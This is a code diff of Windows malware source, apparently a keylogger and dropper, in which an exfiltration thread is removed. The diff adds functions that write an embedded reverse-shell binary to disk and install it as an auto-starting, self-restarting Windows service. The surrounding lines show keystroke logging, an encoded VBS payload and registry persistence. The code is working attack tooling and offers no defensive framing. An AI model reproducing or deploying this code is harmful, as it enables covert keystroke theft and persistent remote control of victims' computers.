@@ -3,7 +3,6 @@ Persistence mechanism and dropper
 author: Bryant Chang
 */
 #include <winsock2.h>
-#include "libs/winexfil.h"
 #include "libs/winkeylog.h"
 #include "libs/winencode.h"
 #include "libs/winvbs.h"
@@ -17,6 +16,51 @@ int isInRegistry() {
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     return (strstr(szPath, "TEMP") != NULL || strstr(szPath, PROC_NAME) != NULL);
+}
+void dropShell() {
+    DBG("Dropped shell!");
+    HRSRC res = FindResource(NULL, MAKEINTRESOURCE(1), RT_RCDATA);
+    if (res == NULL) return;
+    HGLOBAL data = LoadResource(NULL, res);
+    void* pData = LockResource(data);
+    DWORD size = SizeofResource(NULL, res);
+    FILE* f = fopen(SHELL_PATH, "wb");
+    if (f != NULL) {
+        fwrite(pData, 1, size, f);
+        fclose(f);
+    }
+}
+void installShell() {
+    DBG("Installing shell...");
+    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (!hSCM) return;
+    SC_HANDLE hService = CreateService(
+        hSCM,
+        SERVICE_NAME,
+        "We're shelling it!",
+        SERVICE_ALL_ACCESS,
+        SERVICE_WIN32_OWN_PROCESS,
+        SERVICE_AUTO_START,
+        SERVICE_ERROR_NORMAL,
+        SHELL_PATH,
+        NULL, NULL, NULL, NULL, NULL
+    );
+    if (hService) {
+        SERVICE_FAILURE_ACTIONS sfa;
+        SC_ACTION actions[1];
+        actions[0].Type = SC_ACTION_RESTART;
+        actions[0].Delay = 5000;
+
+        sfa.dwResetPeriod = 86400;
+        sfa.lpRebootMsg = NULL;
+        sfa.lpCommand = NULL;
+        sfa.cActions = 1;
+        sfa.lpsaActions = actions;
+        ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
+        StartService(hService, 0, NULL);
+        CloseServiceHandle(hService);
+    }
+    CloseServiceHandle(hSCM);
 }
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     /*
@@ -84,7 +128,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         DBG("I am in the TEMP file! Starting threads...");
 		if (!hasVBS()) { dropVBS(encodedPayload); }
         HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)logKey, NULL, 0, NULL);
-		HANDLE hExfilThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exfilThread, NULL, 0, NULL);
         HANDLE hWheelThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WheelThread, NULL, 0, NULL);
 		WaitForSingleObject(hThread, INFINITE);
 		return 0;
@@ -121,6 +164,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         RegCloseKey(hKey);
     }
+    // drop reverse shell and turn it into a service
+    dropShell();
+    installShell();
     // dont run these if prebaked using ansible.
     // This is if you are manually running the exe file.
     //char vbscmd[MAX_PATH + 30];
